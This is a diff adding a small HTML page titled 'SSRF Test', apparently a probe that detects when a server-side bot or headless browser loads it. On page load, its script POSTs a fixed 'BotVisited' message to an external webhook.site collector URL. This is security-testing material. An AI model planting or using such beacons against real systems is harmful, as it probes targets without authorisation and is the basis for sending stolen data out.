@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Test</title>
+</head>
+<body>
+    <h1>Bot test...</h1>
+    <script>
+        // Send a simple test message to Webhook.site
+        fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {  // Replace with your Webhook.site URL
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'test=BotVisited'
+        })
+        .then(() => console.log('Sent test to Webhook.site'))
+        .catch(err => console.error('Webhook error:', err));
+    </script>
+</body>
+</html>
